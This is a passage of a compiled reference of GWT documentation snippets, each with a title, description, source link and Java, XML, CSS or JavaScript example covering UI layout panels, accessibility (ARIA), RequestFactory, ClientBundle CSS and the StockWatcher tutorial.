https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nTabLayoutPanel p = new TabLayoutPanel(1.5, Unit.EM);\np.add(new HTML(\"this content\"), \"this\");\np.add(new HTML(\"that content\"), \"that\");\np.add(new HTML(\"the other content\"), \"the other\");\n```\n\n----------------------------------------\n\nTITLE: Periodic Execution with Timer in Java for GWT\nDESCRIPTION: Shows how to use Timer's scheduleRepeating method to periodically update a user interface element. The example updates an elapsed time display every half second.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDelayed.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic class Foo {\n\n  // A timer to update the elapsed time count\n  private Timer elapsedTimer;\n  private Label elapsedLabel = new Label();\n  private long startTime;\n\n  public Foo () {\n\n    // ... Add elapsedLabel to a Panel ...\n\n    // Create a new timer\n    elapsedTimer = new Timer () {\n      public void run() {\n        showElapsed();\n      }\n    };\n\n    startTime = System.currentTimeMillis();\n\n    // Schedule the timer for every 1/2 second (500 milliseconds)\n    elapsedTimer.scheduleRepeating(500);\n\n    // ... The elapsed timer has started ...\n  }\n\n  /**\n   * Show the current elapsed time in the elapsedLabel widget.\n   */\n  private void showElapsed () {\n    double elapsedTime = (System.currentTimeMillis() - startTime) / 1000.0;\n    NumberFormat n = NumberFormat.getFormat(\"#,##0.000\");\n    elapsedLabel.setText(\"Elapsed: \" + n.format(elapsedTime));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of GWT Host HTML Page\nDESCRIPTION: A sample host HTML page that loads a GWT application. It references the application's CSS stylesheet and includes the bootstrap JavaScript file that initializes the GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n    <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"Hello.css\">\n    <title></title>\n  </head>\n  <body>\n\n<script type=\"text/javascript\" language='javascript' src='hello/hello.nocache.js'></script>\n    <!-- Along with page title and table headers defined -->\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Initializing StockWatcher Table and Styles in Java\nDESCRIPTION: This snippet shows how to set up the initial table structure for the StockWatcher application and apply styles to various elements using GWT's styling methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n  // Create table for stock data.\n  stocksFlexTable.setText(0, 0, \"Symbol\");\n  stocksFlexTable.setText(0, 1, \"Price\");\n  stocksFlexTable.setText(0, 2, \"Change\");\n  stocksFlexTable.setText(0, 3, \"Remove\");\n\n  // Add styles to elements in the stock list table.\n  stocksFlexTable.getRowFormatter().addStyleName(0, \"watchListHeader\");\n  stocksFlexTable.addStyleName(\"watchList\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 1, \"watchListNumericColumn\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 2, \"watchListNumericColumn\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 3, \"watchListRemoveColumn\");\n\n  // Assemble the Add Stock panel\n  addPanel.add(newSymbolTextBox);\n  addPanel.add(addStockButton);\n  addPanel.addStyleName(\"addPanel\");\n  .\n  .\n  .\n}\n```\n\n----------------------------------------\n\nTITLE: Executing webAppCreator to generate a test project\nDESCRIPTION: Example of using the webAppCreator tool to generate a starter application with test cases, build scripts, and Eclipse launch configurations for a GWT module named com.example.foo.Foo.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n~/Foo> webAppCreator -out fooApp\n        -junit /opt/eclipse/plugins/org.junit_3.8.1/junit.jar\n        com.example.foo.Foo\nCreated directory fooApp/src\nCreated directory fooApp/war\nCreated directory fooApp/war/WEB-INF\nCreated directory fooApp/war/WEB-INF/lib\nCreated directory fooApp/src/com/example/foo\nCreated directory fooApp/src/com/example/foo/client\nCreated directory fooApp/src/com/example/foo/server\nCreated directory fooApp/test/com/example/foo/client\nCreated file fooApp/src/com/example/foo/Foo.gwt.xml\nCreated file fooApp/war/Foo.html\nCreated file fooApp/war/Foo.css\nCreated file fooApp/war/WEB-INF/web.xml\nCreated file fooApp/src/com/example/foo/client/Foo.java\nCreated file fooApp/src/com/example/foo/client/GreetingService.java\nCreated file fooApp/src/com/example/foo/client/GreetingServiceAsync.java\nCreated file fooApp/src/com/example/foo/server/GreetingServiceImpl.java\nCreated file fooApp/build.xml\nCreated file fooApp/README.txt\nCreated file fooApp/test/com/example/foo/client/FooTest.java\nCreated file fooApp/.project\nCreated file fooApp/.classpath\nCreated file fooApp/Foo.launch\nCreated file fooApp/FooTest-dev.launch\nCreated file fooApp/FooTest-prod.launch\nCreated file fooApp/war/WEB-INF/lib/gwt-servlet.jar\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Application Layout with DockLayoutPanel in GWT\nDESCRIPTION: This snippet demonstrates how to create a simple application-style layout using DockLayoutPanel with a header, navigation area, and scrollable content area. It uses EM units for sizing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<g:DockLayoutPanel unit='EM'>\n  <g:north size='4'>\n    <g:Label>Header</g:Label>\n  </g:north>\n\n  <g:west size='16'>\n    <g:Label>Navigation</g:Label>\n  </g:west>\n\n  <g:center>\n    <g:ScrollPanel>\n      <g:Label>Content Area</g:Label>\n    </g:ScrollPanel>\n  </g:center>\n</g:DockLayoutPanel>\n```\n\n----------------------------------------\n\nTITLE: AutoBeanFactory Interface Example\nDESCRIPTION: Shows how to define an AutoBeanFactory interface with methods for creating simple AutoBeans and wrapping existing instances.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\ninterface MyFactory extends AutoBeanFactory {\n  // Factory method for a simple AutoBean\n  AutoBean<Person> person();\n\n  // Factory method for a non-simple type or to wrap an existing instance\n  AutoBean<Person> person(Person toWrap);\n}\n```\n\n----------------------------------------\n\nTITLE: Updating ARIA Attributes for Tree Selection in GWT\nDESCRIPTION: Updates ARIA attributes when tree item selection changes. Sets aria-level and aria-activedescendant properties to reflect the currently selected item.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\n// Called after a new item has been selected\n  private void updateAriaAttributes() {\n\n    // Get the element which contains the text (or widget) content within\n    // the currently-selected TreeItem\n    Element curSelectionContentElem = curSelection.getContentElem();\n\n    ...\n\n    // Set the 'aria-level' state. To do this, we need to compute the level of\n    // the currently selected item.\n    Roles.getTreeitemRole().setAriaLevelProperty(curSelectionContentElem, curSelectionLevel + 1);\n\n    // Set other ARIA states\n    ...\n\n    / Update the 'aria-activedescendant' state for the focusable element to\n    // match the id of the currently selected item\n\n    Roles.getTreeRole().setAriaActivedescendantProperty(focusable,\n        IdReference.of(DOM.getElementAttribute(curSelectionContentElem, \"id\")));\n  }\n```\n\n----------------------------------------\n\nTITLE: Handling HTML5 Storage Events in GWT\nDESCRIPTION: Illustrates how to handle storage events in GWT applications. This is useful for reacting to changes in the storage across different tabs or windows.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nStorage.addStorageEventHandler(new StorageEvent.Handler() {\n    @Override\n    public void onStorageChange(StorageEvent event) {\n        String key = event.getKey();\n        String oldValue = event.getOldValue();\n        String newValue = event.getNewValue();\n        // Handle the storage change\n    }\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Persistent Stock Entity in Java for GWT\nDESCRIPTION: Defines a Stock class with JDO annotations for persistence in Google App Engine. It includes fields for stock symbol, user, and creation date, along with getter and setter methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_23\n\nLANGUAGE: java\nCODE:\n```\n@PersistenceCapable(identityType = IdentityType.APPLICATION)\npublic class Stock {\n\n  @PrimaryKey\n  @Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)\n  private Long id;\n  @Persistent\n  private User user;\n  @Persistent\n  private String symbol;\n  @Persistent\n  private Date createDate;\n\n  public Stock() {\n    this.createDate = new Date();\n  }\n\n  public Stock(User user, String symbol) {\n    this();\n    this.user = user;\n    this.symbol = symbol;\n  }\n\n  public Long getId() {\n    return this.id;\n  }\n\n  public User getUser() {\n    return this.user;\n  }\n\n  public String getSymbol() {\n    return this.symbol;\n  }\n\n  public Date getCreateDate() {\n    return this.createDate;\n  }\n\n  public void setUser(User user) {\n    this.user = user;\n  }\n\n  public void setSymbol(String symbol) {\n    this.symbol = symbol;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GoodbyeView with Composite in GWT MVP\nDESCRIPTION: A concrete implementation of the GoodbyeView interface that extends Composite. It creates a simple panel with a span element to display a goodbye message.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class GoodbyeViewImpl extends Composite implements GoodbyeView {\n    SimplePanel viewPanel = new SimplePanel();\n    Element nameSpan = DOM.createSpan();\n\n    public GoodbyeViewImpl() {\n        viewPanel.getElement().appendChild(nameSpan);\n        initWidget(viewPanel);\n    }\n\n    @Override\n    public void setName(String name) {\n        nameSpan.setInnerText(\"Good-bye, \" + name);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Event Firing Logic for Table Cells\nDESCRIPTION: Helper methods to determine whether click and select events should be fired based on column definitions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_23\n\nLANGUAGE: java\nCODE:\n```\nprivate boolean shouldFireClickEvent(TableCellElement cell) {\n  boolean shouldFireClickEvent = false;\n\n  if (cell != null) {\n    ColumnDefinition<T> columnDefinition =\n      columnDefinitions.get(cell.getCellIndex());\n\n    if (columnDefinition != null) {\n      shouldFireClickEvent = columnDefinition.isClickable();\n    }\n  }\n\n  return shouldFireClickEvent;\n}\n\nprivate boolean shouldFireSelectEvent(TableCellElement cell) {\n  boolean shouldFireSelectEvent = false;\n\n  if (cell != null) {\n    ColumnDefinition<T> columnDefinition =\n      columnDefinitions.get(cell.getCellIndex());\n\n    if (columnDefinition != null) {\n      shouldFireSelectEvent = columnDefinition.isSelectable();\n    }\n  }\n\n  return shouldFireSelectEvent;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing JUnit Test for StockPrice Constructor\nDESCRIPTION: Unit test verifying that the StockPrice class constructor correctly initializes instance fields including symbol, price, change, and change percentage calculations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JUnit.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Verify that the instance fields in the StockPrice class are set correctly.\n */\npublic void testStockPriceCtor() {\n  String symbol = \"XYZ\";\n  double price = 70.0;\n  double change = 2.0;\n  double changePercent = 100.0 * change / price;\n\n  StockPrice sp = new StockPrice(symbol, price, change);\n  assertNotNull(sp);\n  assertEquals(symbol, sp.getSymbol());\n  assertEquals(price, sp.getPrice(), 0.001);\n  assertEquals(change, sp.getChange(), 0.001);\n  assertEquals(changePercent, sp.getChangePercent(), 0.001);\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Logout Functionality\nDESCRIPTION: Implementation of logout functionality with UI components for sign-out link.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_18\n\nLANGUAGE: java\nCODE:\n```\nprivate Anchor signInLink = new Anchor(\"Sign In\");\n  private Anchor signOutLink = new Anchor(\"Sign Out\");\n\n...\n\n  private void loadStockWatcher() {\n    // Set up sign out hyperlink.\n    signOutLink.setHref(loginInfo.getLogoutUrl());\n\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n  ...\n\n    // Assemble Main panel.\n    mainPanel.add(signOutLink);\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n```\n\n----------------------------------------\n\nTITLE: Updating ARIA States in GWT CustomButton\nDESCRIPTION: Demonstrates how to update ARIA states during user interactions in a CustomButton widget. Includes methods for toggling pressed state and setting active/inactive states.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nvoid toggleDown() {\n    // Update a11y state \"aria-pressed\"\n    Roles.getButtonRole().setAriaPressedState(getElement(), PressedValue.of(true));\n  }\n\n  void toggleUp() {\n    // Update a11y state \"aria-pressed\"\n    Roles.getButtonRole().setAriaPressedState(getElement(), PressedValue.of(false));\n  }\n\n  void setInactive() {\n    // Update a11y state \"aria-disabled\"\n    Roles.getButtonRole().setAriaDisabledState(getElement(), false);\n  }\n\n  void setActive() {\n    // Update a11y state \"aria-disabled\"\n    Roles.getButtonRole().setAriaDisabledState(getElement(), true);\n  }\n```\n\n----------------------------------------\n\nTITLE: Creating StackLayoutPanel with Headers in GWT\nDESCRIPTION: Shows implementation of a stack panel with multiple content sections and associated headers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nStackLayoutPanel p = new StackLayoutPanel(Unit.EM);\np.add(new HTML(\"this content\"), new HTML(\"this\"), 4);\np.add(new HTML(\"that content\"), new HTML(\"that\"), 4);\np.add(new HTML(\"the other content\"), new HTML(\"the other\"), 4);\n```\n\n----------------------------------------\n\nTITLE: CSS Value Function Usage\nDESCRIPTION: Demonstrates using the value() function for dynamic property values and combining with @def directive.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_13\n\nLANGUAGE: css\nCODE:\n```\n.myDiv {\n  offset-left: value('imageResource.getWidth', 'px');\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n@def SPRITE_WIDTH value('imageResource.getWidth', 'px')\n\n.selector {\n  width: SPRITE_WIDTH;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Async Provider Pattern in GWT\nDESCRIPTION: A code pattern that associates functionality with an exclusive fragment by wrapping a module in a class that's instantiated within runAsync. This ensures the module code is downloaded only when needed but fully available afterward.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic class Module {\n  // public APIs\n  public doSomething() { /* ... */ }\n  public somethingElse() { /*  ... */ }\n\n  // the module instance; instantiate it behind a runAsync\n  private static Module instance = null;\n\n  // A callback for using the module instance once it's loaded\n  public interface ModuleClient {\n    void onSuccess(Module instance);\n    void onUnavailable();\n  }\n\n  /**\n   *  Access the module's instance.  The callback\n   *  runs asynchronously, once the necessary\n   *  code has downloaded.\n   */\n  public static void createAsync(final ModuleClient client) {\n    GWT.runAsync(new RunAsyncCallback() {\n      public void onFailure(Throwable err) {\n        client.onUnavailable();\n      }\n\n      public void onSuccess() {\n        if (instance == null) {\n          instance = new Module();\n        }\n        client.onSuccess(instance);\n      }\n    });\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing SafeHtml Messages in GWT\nDESCRIPTION: Example demonstrating how to create XSS-safe HTML messages using the SafeHtml return type in a Messages interface. Shows automatic HTML escaping of string parameters while preserving SafeHtml parameters.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic interface ErrorMessages extends Messages {\n   @DefaultMessage(\"A <strong>{0} error</strong> has occurred: {1}.\")\n   SafeHtml errorHtml(String error, SafeHtml details);\n }\n ErrorMessages msgs = GWT.create(ErrorMessages.class)\n\n void showError(String error, SafeHtml details) {\n   errorBar.setHTML(msgs.errorHtml(error, details));\n   errorBar.setVisible(true);\n }\n```\n\n----------------------------------------\n\nTITLE: Setting Tab Index for Heading Element in GWT\nDESCRIPTION: Shows how to make a heading element focusable by adding it to the natural tab order of the page using the Roles API to set the tabindex attribute.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n// Set tab index for a heading element\n  Roles.getHeadingRole().setTabindexExtraAttribute(heading.getElement(), 0);\n```\n\n----------------------------------------\n\nTITLE: Implementing JSONP callbacks in GWT iframe context\nDESCRIPTION: Fixed implementation of JSONP setup and script injection that ensures all code runs in the same iframe context. Uses JSNI to properly handle window references and document manipulation within GWT's iframe rather than the parent window.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_for_json_mashups.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic native static void setup(Hax0r h, String callback) /*-{\n    window[callback] = function(someData) {\n      h.@com.google.gwt.hax0r.client.Hax0r::handle(Lcom/google/gwt/core/client/JavaScriptObject;)(someData);\n    }\n  }-*/;\n\npublic native void addScript(String uniqueId, String url) /*-{\n  var elem = document.createElement(\"script\");\n  elem.setAttribute(\"language\", \"JavaScript\");\n  elem.setAttribute(\"src\", url);\n  document.getElementsByTagName(\"body\")[0].appendChild(elem);\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Initializing ARIA Live Region for AutoComplete in GWT\nDESCRIPTION: Creates and configures an ARIA live region for an autocomplete widget. Sets up a hidden div with region role and assertive live property.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic AutoCompleteWidget() {\n    ...\n    // Create a hidden div where we store the current item text for a\n    // screen reader to speak\n    ariaElement = DOM.createDiv();\n    DOM.setStyleAttribute(ariaElement, \"display\", \"none\");\n    Roles.getRegionRole(ariaElement);\n    Roles.getRegionRole().setAriaLiveProperty(ariaElement, LiveValue.ASSERTIVE);\n    DOM.appendChild(getElement(), ariaElement);\n  }\n```\n\n----------------------------------------\n\nTITLE: Combining DockLayoutPanel and SplitLayoutPanel in GWT\nDESCRIPTION: This XML snippet shows how to combine DockLayoutPanel and SplitLayoutPanel to create a layout with a header and a splitter between the navigation and content areas. It uses EM units for the header and pixel units for the split panel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_9\n\nLANGUAGE: xml\nCODE:\n```\n<g:DockLayoutPanel unit='EM'>\n  <g:north size='4'>\n    <g:Label>Header</g:Label>\n  </g:north>\n\n  <g:center>\n    <g:SplitLayoutPanel>\n      <g:west size='128'>\n        <g:Label>Navigation</g:Label>\n      </g:west>\n\n      <g:center>\n        <g:ScrollPanel>\n          <g:Label>Content Area</g:Label>\n        </g:ScrollPanel>\n      </g:center>\n    </g:SplitLayoutPanel>\n  </g:center>\n</g:DockLayoutPanel>\n```\n\n----------------------------------------\n\nTITLE: Implementing DataResource for Custom Cursor in GWT\nDESCRIPTION: Example of using DataResource to access a custom cursor file and applying it to an element's style using the resource URL.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\ninterface Resources extends ClientBundle {\n  Resources INSTANCE = GWT.create(Resources.class);\n\n  @Source(\"mycursor.cur\")\n  DataResource customCursor();\n}\n\n// Elsewhere\nsomeDiv.getStyle().setProperty(\"cursor\", \"url(\" + Resources.INSTANCE.customCursor().getUrl() + \")\")\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional CSS in GWT CssResource\nDESCRIPTION: Demonstrates the syntax for conditional CSS in GWT. Allows for runtime evaluation of boolean functions or compile-time evaluation based on deferred binding properties. Supports negation, chaining via @elif and @else, and nesting of conditional blocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_15\n\nLANGUAGE: css\nCODE:\n```\n/* Runtime evaluation in a static context */\n@if (com.module.Foo.staticBooleanFunction()) {\n  ... css rules ...\n}\n\n/* Compile-time evaluation */\n@if <deferred-binding-property> <space-separated list of values> {\n  ... css rules ...\n}\n@if user.agent safari gecko1_8 { ... }\n@if locale en { ... }\n\n/* Negation is supported */\n@if !user.agent ie6 opera {\n  ...\n}\n\n/* Chaining is also supported */\n@if (true) {\n} @elif (false) {\n} @else {\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Contact Deletion in GWT MVP Pattern\nDESCRIPTION: This code demonstrates how a presenter handles the deletion of selected contacts. It retrieves the selected rows from the view, maps them to contact IDs from the model, sends a delete request to the server, and updates the view with the new data when the operation completes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  private void deleteSelectedContacts() {\n    List<Integer> selectedRows = display.getSelectedRows();\n    ArrayList<String> ids = new ArrayList<String>();\n\n    for (int i = 0; i < selectedRows.size(); ++i) {\n      ids.add(contactDetails.get(selectedRows.get(i)).getId());\n    }\n\n    rpcService.deleteContacts(ids, new AsyncCallback<ArrayList<ContactDetails>>() {\n      public void onSuccess(ArrayList<ContactDetails> result) {\n        contactDetails = result;\n        List<String> data = new ArrayList<String>();\n\n        for (int i = 0; i < result.size(); ++i) {\n          data.add(contactDetails.get(i).getDisplayName());\n        }\n\n        display.setData(data);\n      }\n\n      public void onFailure(Throwable caught) {\n        ...\n      }\n    });\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Class Name in GWT\nDESCRIPTION: Demonstrates how to query an object for its class name in GWT using Object.getClass().getName(). This is one of the few reflection-like capabilities supported in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsCompatibility.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nObject.getClass().getName()\n```\n\n----------------------------------------\n\nTITLE: Fetching Multiple Nested Relationships with RequestFactory in Java GWT\nDESCRIPTION: Shows how to fetch multiple related properties including nested relationships using dot notation in the with() method. This example retrieves a person with their phone and address details.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_21\n\nLANGUAGE: java\nCODE:\n```\nRequest<Person> findReq = find(personId).with(\"phone\",\"address.city\",\"address.zip\")\n```\n\n----------------------------------------\n\nTITLE: Defining RequestFactory Interface in GWT\nDESCRIPTION: Example of defining a RequestFactory interface for an Expenses application that provides access to different service requests for employees, expenses, and reports.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic interface ExpensesRequestFactory extends RequestFactory {\n\n  EmployeeRequest employeeRequest();\n\n  ExpenseRequest expenseRequest();\n\n  ReportRequest reportRequest();\n\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing Data Resources in GWT CssResource\nDESCRIPTION: Shows how to reference DataResources from CSS using the @url directive. This allows embedding URLs to external resources like custom cursors directly in CSS.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_18\n\nLANGUAGE: css\nCODE:\n```\n/* @url <constant name> <DataResource method name> */\n@url myCursorUrl fancyCursorResource;\n\n.myClass {\n  cursor: myCursorUrl, pointer;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing CSS Selector Obfuscation in GWT\nDESCRIPTION: Demonstrates how to use CssResource for selector obfuscation, which helps prevent CSS class name collisions. Shows the Java interface for accessing generated class names with compile-time verification.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_23\n\nLANGUAGE: java\nCODE:\n```\n    class Resources {\n      MyCSSResource myCSSResource();\n    }\n    class MyCSSResource extends CSSResource {\n      Sprite mySpriteClass();\n      String someOtherClass();\n      String hookClass();\n    }\n    myWidget.addStyleName(resource.mySpriteClass());\n```\n\n----------------------------------------\n\nTITLE: Using an Exported Java Type from JavaScript\nDESCRIPTION: This snippet shows how to use a Java class exported with @JsType from JavaScript. It demonstrates instantiating the class and calling its methods from JavaScript code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// Note that exporting of Java Objects to JavaScript to be accessed by their\n// namespace (e.g. this sample) requires -generateJsInteropExports flag.\n\n// the package name serves as a JS namespace\nvar aClass = new com.gwt.example.MyClass('World');\n\nconsole.log(aClass.sayHello());\n\n// result: 'Hello World'\n```\n\n----------------------------------------\n\nTITLE: Implementing Remove Stock Button in GWT FlexTable\nDESCRIPTION: Creates a button for removing stocks from the tracking list and implements its click handler. When clicked, the handler removes the stock from both the ArrayList and the FlexTable display.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n// Add a button to remove this stock from the table.\nButton removeStockButton = new Button(\"x\");\nremoveStockButton.addClickHandler(new ClickHandler() {\n  public void onClick(ClickEvent event) {\n    int removedIndex = stocks.indexOf(symbol);\n    stocks.remove(removedIndex);\n    stocksFlexTable.removeRow(removedIndex + 1);\n  }\n});\nstocksFlexTable.setWidget(row, 3, removeStockButton);\n```\n\n----------------------------------------\n\nTITLE: Implementing Plural Forms with GWT Messages Interface\nDESCRIPTION: Implementation example of plural forms in a Messages interface using @DefaultMessage, @AlternateMessage, and @PluralCount annotations to handle different text for singular and plural cases.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"You have {0} trees.\")\n  @AlternateMessage({\"one\", \"You have one tree.\"})\n  String treeCount(@PluralCount int count);\n}\n```\n\n----------------------------------------\n\nTITLE: Using SafeHtml Resources in UiBinder Templates\nDESCRIPTION: Shows two approaches for incorporating SafeHtml content in UiBinder templates: using the <ui:safehtml> element or directly using SafeHtml implementing classes. Includes a SafeHtmlTemplates implementation for XSS protection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_28\n\nLANGUAGE: xml\nCODE:\n```\n<ui:with field='res' type='com.my.app.widgets.logoname.Resources'/>\n\n<div>\n  Hello, <ui:safehtml from='{res.fancyUserName}'/>.  \n</div>\n```\n\nLANGUAGE: xml\nCODE:\n```\n<div>\n  Hello, <my:FancyUserNameRenderer style=\"MOBILE\">World</my:FancyUserNameRenderer>.\n</div>\n```\n\nLANGUAGE: java\nCODE:\n```\npublic class FancyUserNameRenderer implements SafeHtml, HasText {\n  enum Style {\n    MOBILE, DESKTOP\n  }\n\n  interface Templates extends SafeHtmlTemplates {\n    @SafeHtmlTemplates.Template(\"<span class=\\\"mobile\\\">{0}</span>\")\n    SafeHtml mobile(String name);\n\n    @SafeHtmlTemplates.Template(\"<div class=\\\"desktop\\\">{0}</div>\")\n    SafeHtml desktop(String name);\n  }\n  private static final Templates TEMPLATES = GWT.create(Templates.class);\n\n  private final Style style;\n  private String name;\n\n  @UiConstructor\n  public FancyResources(Style style) {\n    this.style = style;\n  }\n\n  void setText(String text) {\n    this.name = text;\n  }\n\n  @Override\n  String asString() {\n    switch (style) {\n      Style.MOBILE: return TEMPLATES.mobile(name);\n    }\n    return Style.DESKTOP: return TEMPLATES.desktop(name);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Java Callback Functions from JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to use Java methods that accept or return callback functions. It shows calling methods with JavaScript lambda expressions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n\ncom.example.Bar.action1((x) => x + 2); // will return 42!\n\nvar fn = com.example.Bar.action2();\nfn(40); // will return 42!\n```\n\n----------------------------------------\n\nTITLE: Including External Stylesheet in GWT Module\nDESCRIPTION: Syntax for including external CSS files in a GWT module to automatically attach stylesheets to the host page.\nSOURCE: 